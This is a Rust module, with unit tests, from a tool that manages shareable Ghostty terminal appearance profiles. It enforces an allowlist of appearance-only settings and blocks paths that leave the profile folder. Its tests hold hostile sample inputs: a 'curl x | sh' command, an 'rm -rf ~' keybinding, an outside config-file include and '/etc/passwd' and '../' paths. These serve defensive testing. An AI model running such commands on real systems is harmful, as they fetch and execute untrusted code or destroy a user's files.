//! A profile is a folder: `profile.conf` (native Ghostty syntax) plus `shaders/` and `images/`.
//!
//! Asset paths inside `profile.conf` are relative to the folder, so a profile
//! can be moved or shared as-is. [`Profile::render`] makes them absolute for
//! the generated active config that Ghostty actually loads.

use std::collections::BTreeMap;
use std::fs;
use std::path::{Component, Path, PathBuf};

use anyhow::{Context, Result, bail};

use crate::confparse::{self, Line};
use crate::shaderparams::{self, Schema};

pub const CONF_NAME: &str = "profile.conf";
pub const SHADER_KEY: &str = "custom-shader";
pub const IMAGE_KEY: &str = "background-image";
const IMAGE_PREFIX: &str = "background-image";
/// Keys whose value is a file path that lives in the profile folder.
pub const ASSET_KEYS: [&str; 2] = [SHADER_KEY, IMAGE_KEY];

/// Keys that describe a "look". Only these are ever written into the active Ghostty config.
///
/// This is a security boundary, not tidiness: profiles are meant to be shared, and a Ghostty
/// config can run programs (`command`, `initial-command`), rebind keys (`keybind`) or pull in
/// other files (`config-file`). A profile from someone else must never be able to do that.
const APPEARANCE_PREFIXES: [&str; 14] = [
    "font-",
    "adjust-",
    "window-padding",
    "background",
    "foreground",
    "cursor-",
    "selection-",
    "palette",
    "custom-shader",
    "minimum-contrast",
    "bold-color",
    "split-divider",
    "unfocused-split",
    "alpha-blending",
];
const APPEARANCE_EXACT: [&str; 4] = ["theme", "window-theme", "window-colorspace", "faint-opacity"];

pub fn is_appearance_key(key: &str) -> bool {
    APPEARANCE_EXACT.contains(&key) || APPEARANCE_PREFIXES.iter().any(|p| key.starts_with(p))
}

/// Where a shader's parameter values live: `shaders/a.glsl` -> `shaders/a.params`.
pub fn sidecar_rel(shader_rel: &str) -> String {
    match shader_rel.strip_suffix(".glsl") {
        Some(stem) => format!("{stem}.params"),
        None => format!("{shader_rel}.params"),
    }
}

/// Largest shader or sidecar file read (a sanity limit against a shared profile with a huge file).
const MAX_SHADER_BYTES: u64 = 1_000_000;

/// A tunable shader as the TUI shows it: its declared parameters and their current values.
#[derive(Clone, Debug)]
pub struct ParamState {
    pub rel: String,
    pub schema: Schema,
    /// One resolved (canonical) value per parameter, in schema order.
    pub values: Vec<String>,
}

/// `#F60` / `ff6a00` / `"#FF6A00"` -> `#ff6a00`; `None` if it is not a color.
pub fn normalize_hex(value: &str) -> Option<String> {
    let v = value.trim().trim_matches('"');
    let v = v.strip_prefix('#').unwrap_or(v);
    if !v.chars().all(|c| c.is_ascii_hexdigit()) {
        return None;
    }
    match v.len() {
        3 => Some(format!("#{}", v.chars().flat_map(|c| [c, c]).collect::<String>().to_lowercase())),
        6 => Some(format!("#{}", v.to_lowercase())),
        _ => None,
    }
}

/// `#rrggbb` -> (r, g, b).
pub fn hex_rgb(hex: &str) -> Option<(u8, u8, u8)> {
    let h = normalize_hex(hex)?;
    let n = |i: usize| u8::from_str_radix(&h[i..i + 2], 16).ok();
    Some((n(1)?, n(3)?, n(5)?))
}

fn unquote(v: &str) -> &str {
    let v = v.trim();
    if v.len() >= 2 && v.starts_with('"') && v.ends_with('"') { &v[1..v.len() - 1] } else { v }
}

/// True if the text has a control character (a stray carriage return, escape, NUL...). Real
/// settings never do; a shared profile that does is trying something.
pub fn has_control_chars(v: &str) -> bool {
    v.chars().any(|c| c.is_control() && c != '\t')
}

/// True if `rel` is a plain relative path that stays inside its folder: no absolute path, no `..`,
/// and no `~` or `$VAR` that would point somewhere else on this machine.
pub fn is_contained_relative(rel: &str) -> bool {
    let rel = unquote(rel);
    if rel.starts_with('~') || rel.contains('$') || has_control_chars(rel) {
        return false;
    }
    let p = Path::new(rel);
    !p.as_os_str().is_empty()
        && !p.is_absolute()
        && p.components().all(|c| matches!(c, Component::Normal(_) | Component::CurDir))
}

#[derive(Clone, Debug)]
pub struct Profile {
    pub name: String,
    pub dir: PathBuf,
    pub lines: Vec<Line>,
}

impl Profile {
    pub fn new(name: &str, dir: &Path) -> Self {
        Self { name: name.to_string(), dir: dir.to_path_buf(), lines: Vec::new() }
    }

    // ---- io ---------------------------------------------------------------
    pub fn load(dir: &Path) -> Result<Self> {
        let conf = dir.join(CONF_NAME);
        let text = if conf.exists() {
            fs::read_to_string(&conf).with_context(|| format!("reading {}", conf.display()))?
        } else {
            String::new()
        };
        let name = dir.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
        Ok(Self { name, dir: dir.to_path_buf(), lines: confparse::parse(&text) })
    }

    pub fn save(&self) -> Result<()> {
        fs::create_dir_all(&self.dir)?;
        crate::store::atomic_write(&self.dir.join(CONF_NAME), &confparse::dump(&self.lines))
    }

    // ---- metadata ----------------------------------------------------------
    fn description_index(&self) -> Option<usize> {
        self.lines.iter().position(|l| {
            !l.is_entry() && l.text().trim_start().trim_start_matches('#').trim_start().starts_with("description:")
        })
    }

    pub fn description(&self) -> String {
        self.description_index()
            .and_then(|i| self.lines[i].text().split_once("description:").map(|(_, d)| d.trim().to_string()))
            .unwrap_or_default()
    }

    pub fn set_description(&mut self, text: &str) {
        let line = confparse::comment(&format!("# description: {text}"));
        match self.description_index() {
            Some(i) => self.lines[i] = line,
            None => self.lines.insert(0, line),
        }
    }

    // ---- key access --------------------------------------------------------
    pub fn get_all(&self, key: &str) -> Vec<String> {
        self.lines.iter().filter(|l| l.key() == Some(key)).filter_map(|l| l.value().map(str::to_string)).collect()
    }

    /// The last value for `key` (Ghostty: the last one wins).
    pub fn get(&self, key: &str) -> Option<String> {
        self.get_all(key).pop()
    }

    /// Replace every occurrence of `key` with one entry, in place of the first.
    pub fn set(&mut self, key: &str, value: &str) {
        self.set_all(key, &[value.to_string()]);
    }

    pub fn set_all(&mut self, key: &str, values: &[String]) {
        let first = self.lines.iter().position(|l| l.key() == Some(key));
        let new: Vec<Line> = values.iter().map(|v| confparse::entry(key, v)).collect();
        match first {
            Some(i) => {
                let before: Vec<Line> = self.lines[..i].to_vec();
                let after: Vec<Line> = self.lines[i..].iter().filter(|l| l.key() != Some(key)).cloned().collect();
                self.lines = [before, new, after].concat();
            }
            None => self.lines.extend(new),
        }
    }

    pub fn remove(&mut self, key: &str) {
        self.lines.retain(|l| l.key() != Some(key));
    }

    pub fn remove_prefix(&mut self, prefix: &str) {
        self.lines.retain(|l| !l.key().is_some_and(|k| k.starts_with(prefix)));
    }

    // ---- palette ---------------------------------------------------------
    pub fn palette(&self) -> BTreeMap<u8, String> {
        let mut out = BTreeMap::new();
        for v in self.get_all("palette") {
            if let Some((i, c)) = v.split_once('=')
                && let (Ok(n), Some(c)) = (i.trim().parse::<u8>(), normalize_hex(c))
            {
                out.insert(n, c);
            }
        }
        out
    }

    pub fn set_palette(&mut self, palette: &BTreeMap<u8, String>) {
        let values: Vec<String> = palette.iter().map(|(i, c)| format!("{i}={c}")).collect();
        self.set_all("palette", &values);
    }

    pub fn set_palette_color(&mut self, index: u8, color: &str) {
        let mut p = self.palette();
        p.insert(index, color.to_string());
        self.set_palette(&p);
    }

    pub fn color(&self, key: &str) -> Option<String> {
        self.get(key).and_then(|v| normalize_hex(&v))
    }

    // ---- assets ------------------------------------------------------------
    /// Where an asset value points: relative values resolve inside the profile folder.
    pub fn resolve_asset(&self, value: &str) -> PathBuf {
        let v = unquote(value);
        let p = expand_tilde(v);
        if p.is_absolute() { p } else { self.dir.join(p) }
    }

    pub fn shaders(&self) -> Vec<String> {
        self.get_all(SHADER_KEY)
    }

    pub fn image(&self) -> Option<String> {
        self.get(IMAGE_KEY)
    }

    /// Copy a file into `shaders/` or `images/` of this profile; returns the relative path to store.
    pub fn add_asset(&self, kind: AssetKind, src: &Path, name: Option<&str>) -> Result<String> {
        let sub = kind.dir();
        let dest_dir = self.dir.join(sub);
        fs::create_dir_all(&dest_dir)?;
        let file = match name {
            Some(n) => n.to_string(),
            None => src.file_name().map(|n| n.to_string_lossy().into_owned()).context("asset has no file name")?,
        };
        let dest = dest_dir.join(&file);
        if fs::canonicalize(src).ok() != fs::canonicalize(&dest).ok() {
            fs::copy(src, &dest).with_context(|| format!("copying {}", src.display()))?;
        }
        Ok(format!("{sub}/{file}"))
    }

    // ---- shader parameters -----------------------------------------------------------
    /// The profile's copy of shader `rel` (contained in the profile folder and present), if readable.
    fn read_shader(&self, rel: &str) -> Option<(PathBuf, String)> {
        if !is_contained_relative(rel) {
            return None;
        }
        let path = self.dir.join(unquote(rel));
        let meta = fs::metadata(&path).ok().filter(|m| m.is_file() && m.len() <= MAX_SHADER_BYTES)?;
        let _ = meta;
        Some((path.clone(), fs::read_to_string(path).ok()?))
    }

    fn read_sidecar(&self, rel: &str) -> std::collections::BTreeMap<String, String> {
        let path = self.dir.join(sidecar_rel(unquote(rel)));
        let ok = fs::metadata(&path).is_ok_and(|m| m.is_file() && m.len() <= 64 * 1024);
        if !ok {
            return Default::default();
        }
        shaderparams::parse_values(&fs::read_to_string(path).unwrap_or_default())
    }

    /// The tunable parameters of shader `rel` and their current values; `None` if it has none.
    pub fn shader_param_state(&self, rel: &str) -> Option<ParamState> {
        let (_, text) = self.read_shader(rel)?;
        let body = shaderparams::strip_header(&text);
        if !shaderparams::has_annotations(body) {
            return None;
        }
        let schema = shaderparams::parse_schema(body).ok().filter(|s| !s.params.is_empty())?;
        let values = shaderparams::resolve(&schema, &self.read_sidecar(rel));
        Some(ParamState { rel: rel.to_string(), schema, values })
    }

    /// Regenerate the parameter header of every shader this profile uses from its `.params` values.
    /// Untouched copies of shaders from older releases are first upgraded to the current library
    /// version. Files are only rewritten when their content changes. Returns notes about shaders
    /// whose annotations are malformed (those are left alone).
    pub fn render_shaders(&self) -> Result<Vec<String>> {
        let mut notes = Vec::new();
        for rel in self.shaders() {
            if let Some(n) = self.render_shader(&rel)? {
                notes.push(n);
            }
        }
        Ok(notes)
    }

    fn render_shader(&self, rel: &str) -> Result<Option<String>> {
        let Some((path, text)) = self.read_shader(rel) else { return Ok(None) };
        let file_name =
            Path::new(unquote(rel)).file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
        let current = crate::presets::upgrade_legacy_shader(&file_name, &text)
            .map(str::to_string)
            .unwrap_or_else(|| text.clone());
        match shaderparams::render(&current, &self.read_sidecar(rel)) {
            Ok(out) => {
                if out != text {
                    crate::store::atomic_write(&path, &out)?;
                }
                Ok(None)
            }
            Err(e) => Ok(Some(format!("{rel}: {e}"))),
        }
    }

    /// Set parameter values (`(name, text)`), validating each; saves the sidecar and re-renders the shader.
    pub fn set_shader_params(&self, rel: &str, updates: &[(String, String)]) -> Result<()> {
        let state = self.shader_param_state(rel).with_context(|| format!("{rel} has no tunable parameters"))?;
        let mut values = state.values.clone();
        for (name, text) in updates {
            let i = state
                .schema
                .params
                .iter()
                .position(|p| p.name == *name)
                .with_context(|| format!("{rel} has no parameter '{name}'"))?;
            values[i] = shaderparams::validate_value(&state.schema.params[i], text).map_err(anyhow::Error::msg)?;
        }
        crate::store::atomic_write(
            &self.dir.join(sidecar_rel(unquote(rel))),
            &shaderparams::format_values(&state.schema, &values),
        )?;
        self.render_shader(rel)?;
        Ok(())
    }

    /// Apply a named preset of the shader's: its values over the defaults.
    pub fn apply_shader_preset(&self, rel: &str, preset: &str) -> Result<()> {
        let state = self.shader_param_state(rel).with_context(|| format!("{rel} has no tunable parameters"))?;
        let p = state
            .schema
            .presets
            .iter()
            .find(|p| p.name == preset)
            .with_context(|| format!("{rel} has no preset '{preset}'"))?;
        let values = shaderparams::preset_values(&state.schema, p);
        crate::store::atomic_write(
            &self.dir.join(sidecar_rel(unquote(rel))),
            &shaderparams::format_values(&state.schema, &values),
        )?;
        self.render_shader(rel)?;
        Ok(())
    }

    /// Forget the profile's values for this shader: back to its defaults.
    pub fn reset_shader_params(&self, rel: &str) -> Result<()> {
        let path = self.dir.join(sidecar_rel(unquote(rel)));
        match fs::remove_file(&path) {
            Ok(()) => {}
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => return Err(e.into()),
        }
        self.render_shader(rel)?;
        Ok(())
    }

    pub fn set_shaders(&mut self, rel_paths: &[String]) {
        if rel_paths.is_empty() {
            self.remove(SHADER_KEY);
            self.remove("custom-shader-animation");
        } else {
            self.set_all(SHADER_KEY, rel_paths);
        }
    }

    /// Keys in this profile that are not appearance settings (and so are never applied).
    pub fn ignored_keys(&self) -> Vec<String> {
        let mut v: Vec<String> =
            self.lines.iter().filter(|l| !l.is_allowed()).filter_map(|l| l.key()).map(str::to_string).collect();
        v.sort();
        v.dedup();
        v
    }

    // ---- rendering -----------------------------------------------------------
    /// Ghostty config text with asset paths made absolute (the generated active conf).
    /// Only appearance settings are emitted; anything else in the file is dropped.
    pub fn render(&self) -> String {
        let mut out = format!(
            "# Generated by ghostty-profiles from profile '{}'. Do not edit; edit the profile instead.\n",
            self.name
        );
        for l in &self.lines {
            match (l.key(), l.value()) {
                (Some(_), _) if !l.is_allowed() => {}
                (Some(k), Some(v)) if ASSET_KEYS.contains(&k) && !v.is_empty() => {
                    out.push_str(&format!("{k} = {}\n", self.resolve_asset(v).display()));
                }
                (Some(k), Some(v)) => out.push_str(&format!("{k} = {v}\n")),
                _ if !l.text().trim().is_empty() => {
                    out.push_str(l.text());
                    out.push('\n');
                }
                _ => {}
            }
        }
        out
    }

    // ---- sharing -------------------------------------------------------------
    /// Write a self-contained, portable copy. Images are dropped unless `with_images`.
    /// Returns notes about what was changed or left out.
    pub fn export(&self, dest: &Path, with_images: bool, overwrite: bool) -> Result<Vec<String>> {
        if dest.exists() {
            if !overwrite {
                bail!("{} already exists", dest.display());
            }
            fs::remove_dir_all(dest)?;
        }
        fs::create_dir_all(dest)?;
        let mut copy = Profile { name: self.name.clone(), dir: dest.to_path_buf(), lines: Vec::new() };
        let mut notes = Vec::new();
        for l in &self.lines {
            let (Some(k), Some(v)) = (l.key(), l.value()) else {
                copy.lines.push(l.clone());
                continue;
            };
            if k == SHADER_KEY && !v.is_empty() {
                let src = self.resolve_asset(v);
                if src.is_file() {
                    let rel = copy.add_asset(AssetKind::Shader, &src, None)?;
                    copy.lines.push(confparse::entry(k, &rel));
                    // the shader's parameter values travel with it
                    let side = src.with_extension("params");
                    if fs::metadata(&side).is_ok_and(|m| m.is_file() && m.len() <= 64 * 1024) {
                        fs::copy(&side, dest.join(sidecar_rel(&rel)))?;
                    }
                } else {
                    notes.push(format!("shader not found, left out: {v}"));
                }
            } else if k.starts_with(IMAGE_PREFIX) && !with_images {
                if k == IMAGE_KEY {
                    notes.push(format!("background image not exported: {}", file_name_of(v)));
                }
            } else if k == IMAGE_KEY && !v.is_empty() {
                let src = self.resolve_asset(v);
                if src.is_file() {
                    let rel = copy.add_asset(AssetKind::Image, &src, None)?;
                    copy.lines.push(confparse::entry(k, &rel));
                } else {
                    notes.push(format!("background image not found, left out: {}", file_name_of(v)));
                }
            } else {
                copy.lines.push(l.clone());
            }
        }
        copy.save()?;
        Ok(notes)
    }
}

fn file_name_of(v: &str) -> String {
    Path::new(unquote(v)).file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default()
}

fn expand_tilde(v: &str) -> PathBuf {
    if let Some(rest) = v.strip_prefix("~/")
        && let Some(home) = std::env::var_os("HOME")
    {
        return Path::new(&home).join(rest);
    }
    PathBuf::from(v)
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum AssetKind {
    Shader,
    Image,
}

impl AssetKind {
    pub fn dir(self) -> &'static str {
        match self {
            AssetKind::Shader => "shaders",
            AssetKind::Image => "images",
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn temp_profile(conf: &str) -> (tempfile::TempDir, Profile) {
        let td = tempfile::tempdir().unwrap();
        let dir = td.path().join("p");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join(CONF_NAME), conf).unwrap();
        let p = Profile::load(&dir).unwrap();
        (td, p)
    }

    #[test]
    fn hex_normalizes_and_rejects() {
        assert_eq!(normalize_hex("#F60").as_deref(), Some("#ff6600"));
        assert_eq!(normalize_hex("ff6a00").as_deref(), Some("#ff6a00"));
        assert_eq!(normalize_hex("\"#FF6A00\"").as_deref(), Some("#ff6a00"));
        for bad in ["", "#12", "#12345", "#gggggg", "#1234567", "red"] {
            assert_eq!(normalize_hex(bad), None, "{bad}");
        }
        assert_eq!(hex_rgb("#ff6a00"), Some((255, 106, 0)));
    }

    #[test]
    fn get_set_and_last_wins() {
        let (_t, mut p) = temp_profile("# description: d\nfont-size = 12\nfont-size = 14\nbackground = #000000\n");
        assert_eq!(p.get("font-size").as_deref(), Some("14"));
        p.set("font-size", "16");
        assert_eq!(p.get_all("font-size"), vec!["16"]);
        // replaced in place of the first, order otherwise preserved
        let keys: Vec<_> = p.lines.iter().filter_map(|l| l.key()).collect();
        assert_eq!(keys, vec!["font-size", "background"]);
        p.set("cursor-color", "#fff");
        assert_eq!(p.get("cursor-color").as_deref(), Some("#fff"));
        p.remove("background");
        assert_eq!(p.get("background"), None);
        assert_eq!(p.description(), "d");
        p.set_description("new");
        assert_eq!(p.description(), "new");
    }

    #[test]
    fn palette_get_set() {
        let (_t, mut p) =
            temp_profile("palette = 0=#0A0A0A\npalette = 1=#e23636\npalette = x=#fff\npalette = 2=nope\n");
        let pal = p.palette();
        assert_eq!(pal.len(), 2);
        assert_eq!(pal[&0], "#0a0a0a");
        p.set_palette_color(15, "#ffffff");
        p.set_palette_color(1, "#ff0000");
        assert_eq!(p.get_all("palette"), vec!["0=#0a0a0a", "1=#ff0000", "15=#ffffff"]);
    }

    #[test]
    fn render_makes_assets_absolute_and_leaves_the_rest() {
        let (_t, p) = temp_profile(
            "# description: x\nbackground = #000\ncustom-shader = shaders/a.glsl\nbackground-image = images/b.png\ncustom-shader-animation = true\n",
        );
        let out = p.render();
        let shader = p.dir.join("shaders/a.glsl");
        assert!(out.contains(&format!("custom-shader = {}", shader.display())));
        assert!(out.contains(&format!("background-image = {}", p.dir.join("images/b.png").display())));
        assert!(out.contains("background = #000"));
        assert!(out.contains("custom-shader-animation = true"));
        assert!(out.contains("Generated by ghostty-profiles"));
        assert!(!out.contains("= shaders/"));
    }

    #[test]
    fn render_never_emits_anything_that_is_not_an_appearance_setting() {
        let evil = "# description: a shared look\nbackground = #000\ncommand = /bin/sh -c 'curl x | sh'\ninitial-command = open -a Calculator\nkeybind = ctrl+a=text:rm -rf ~\\n\nconfig-file = /tmp/evil.conf\nconfig-file = ?other\nshell-integration = none\nwindow-save-state = always\nlink-url = true\nnotify-on-command-finish = always\nfont-size = 14\n";
        let (_t, p) = temp_profile(evil);
        let out = p.render();
        for bad in
            ["command", "keybind", "config-file", "shell-integration", "window-save-state", "link-url", "notify-on"]
        {
            assert!(!out.contains(bad), "{bad} leaked into:\n{out}");
        }
        assert!(out.contains("background = #000") && out.contains("font-size = 14"));
        assert_eq!(
            p.ignored_keys(),
            vec![
                "command",
                "config-file",
                "initial-command",
                "keybind",
                "link-url",
                "notify-on-command-finish",
                "shell-integration",
                "window-save-state"
            ]
        );
    }

    #[test]
    fn appearance_allowlist_covers_the_look_and_nothing_executable() {
        for ok in [
            "font-family",
            "font-size",
            "adjust-cell-width",
            "background",
            "background-opacity",
            "background-image-fit",
            "foreground",
            "cursor-color",
            "cursor-style",
            "selection-background",
            "palette",
            "custom-shader",
            "custom-shader-animation",
            "window-padding-x",
            "theme",
            "minimum-contrast",
        ] {
            assert!(is_appearance_key(ok), "{ok}");
        }
        for bad in [
            "command",
            "initial-command",
            "keybind",
            "config-file",
            "working-directory",
            "shell-integration",
            "env",
            "quick-terminal-screen",
            "macos-applescript",
            "link-url",
            "clipboard-write",
            "title-report",
            "desktop-notifications",
            "auto-update",
            "window-save-state",
        ] {
            assert!(!is_appearance_key(bad), "{bad}");
        }
    }

    #[test]
    fn export_drops_images_but_keeps_shaders_self_contained() {
        let (t, p) = temp_profile(
            "background = #000\ncustom-shader = shaders/a.glsl\nbackground-image = images/b.png\nbackground-image-opacity = 0.4\nbackground-image-fit = cover\n",
        );
        fs::create_dir_all(p.dir.join("shaders")).unwrap();
        fs::create_dir_all(p.dir.join("images")).unwrap();
        fs::write(p.dir.join("shaders/a.glsl"), "void mainImage(){}").unwrap();
        fs::write(p.dir.join("images/b.png"), "PNGDATA").unwrap();
        let dest = t.path().join("out");
        let notes = p.export(&dest, false, false).unwrap();
        assert!(notes.iter().any(|n| n.contains("b.png")));
        assert!(dest.join("shaders/a.glsl").is_file());
        assert!(!dest.join("images").exists());
        let conf = fs::read_to_string(dest.join(CONF_NAME)).unwrap();
        assert!(conf.contains("custom-shader = shaders/a.glsl"));
        assert!(!conf.contains("background-image"), "{conf}");
        // refuses to clobber, unless asked
        assert!(p.export(&dest, false, false).is_err());
        let dest2 = t.path().join("out2");
        p.export(&dest2, true, false).unwrap();
        assert!(dest2.join("images/b.png").is_file());
        assert!(fs::read_to_string(dest2.join(CONF_NAME)).unwrap().contains("background-image = images/b.png"));
    }

    #[test]
    fn export_makes_absolute_shaders_self_contained_and_reports_missing() {
        let (t, mut p) = temp_profile("background = #000\n");
        let abs = t.path().join("elsewhere.glsl");
        fs::write(&abs, "// shader").unwrap();
        p.set_all(SHADER_KEY, &[abs.display().to_string(), "shaders/gone.glsl".into()]);
        let dest = t.path().join("out");
        let notes = p.export(&dest, false, false).unwrap();
        let conf = fs::read_to_string(dest.join(CONF_NAME)).unwrap();
        assert!(conf.contains("custom-shader = shaders/elsewhere.glsl"), "{conf}");
        assert!(!conf.contains(t.path().to_str().unwrap()), "no absolute path leaks: {conf}");
        assert!(notes.iter().any(|n| n.contains("gone.glsl")));
    }

    #[test]
    fn contained_relative_paths() {
        assert!(is_contained_relative("shaders/a.glsl"));
        assert!(!is_contained_relative("../a.glsl"));
        assert!(!is_contained_relative("shaders/../../a"));
        assert!(!is_contained_relative("/etc/passwd"));
        for bad in ["~/x.png", "$HOME/x", "shaders/$X", "\"~/x\"", "a\rb"] {
            assert!(!is_contained_relative(bad), "{bad:?}");
        }
        assert!(!is_contained_relative(""));
    }
}
